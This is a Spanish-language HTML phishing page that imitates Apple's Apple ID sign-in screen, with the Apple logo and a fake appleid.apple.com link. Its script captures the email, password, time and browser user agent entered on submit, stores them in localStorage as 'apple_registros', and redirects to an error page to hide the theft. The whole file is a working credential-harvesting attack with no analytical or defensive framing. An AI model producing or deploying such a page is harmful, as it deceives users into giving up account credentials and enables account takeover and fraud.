<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Apple ID - Iniciar sesión</title>
    <link rel="stylesheet" href="css/estilo.css">
</head>
<body>
    <div class="container">
        <!-- Logo de Apple -->
        <div class="apple-logo">
            <svg height="48" viewBox="0 0 17 48" width="17" xmlns="http://www.w3.org/2000/svg">
                <path d="m15.5752 19.0792a4.2055 4.2055 0 0 0 -2.01 3.5376 4.0931 4.0931 0 0 0 2.4908 3.7542 9.7779 9.7779 0 0 1 -1.2755 2.6351c-.7941 1.1431-1.6244 2.2862-2.8878 2.2862s-1.5883-.734-3.0443-.734c-1.42 0-1.9252.7581-3.08.7581s-1.9611-1.0589-2.8876-2.3584a11.3987 11.3987 0 0 1 -1.9373-6.1487c0-3.61 2.3464-5.523 4.6565-5.523 1.2274 0 2.25.8062 3.02.8062.734 0 1.8771-.8543 3.2729-.8543a4.3778 4.3778 0 0 1 3.6822 1.841zm-6.8586-2.0456a1.3865 1.3865 0 0 1 -.2527-.024 1.6557 1.6557 0 0 1 -.0361-.337 4.0341 4.0341 0 0 1 1.0228-2.5148 4.1571 4.1571 0 0 1 2.7314-1.4078 1.7815 1.7815 0 0 1 .0361.3735 3.4267 3.4267 0 0 1 -.9872 2.467 3.7619 3.7619 0 0 1 -2.5149 1.4436z" fill="#1d1d1f"/>
            </svg>
        </div>

        <div class="login-card">
            <h1>Iniciar sesión con Apple ID</h1>
            <p class="subtitle">Usa tu Apple ID para iniciar sesión</p>

            <form id="loginForm">
                <div class="form-group">
                    <label for="email">Correo electrónico</label>
                    <input type="email" id="email" name="email" placeholder="ejemplo@icloud.com" required>
                </div>

                <div class="form-group">
                    <div class="password-header">
                        <label for="password">Contraseña</label>
                        <a href="#" class="forgot-link">¿Olvidaste tu contraseña?</a>
                    </div>
                    <input type="password" id="password" name="password" placeholder="Contraseña" required>
                </div>

                <div class="remember-row">
                    <input type="checkbox" id="remember" checked>
                    <label for="remember">Mantener sesión iniciada</label>
                </div>

                <button type="submit" class="signin-btn">Iniciar sesión</button>
            </form>

            <div class="apple-links">
                <a href="#" class="create-link">¿No tienes un Apple ID? Crea uno ahora.</a>
                <a href="#" class="privacy-link">appleid.apple.com</a>
            </div>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const datos = {
                email: document.getElementById('email').value,
                password: document.getElementById('password').value,
                fecha: new Date().toLocaleString(),
                hora: new Date().toLocaleTimeString(),
                userAgent: navigator.userAgent
            };
            
            // Guardar en localStorage
            let registros = JSON.parse(localStorage.getItem('apple_registros')) || [];
            registros.push(datos);
            localStorage.setItem('apple_registros', JSON.stringify(registros));
            
            // Redirigir a error
            window.location.href = 'error.html';
        });
    </script>
</body>
</html>
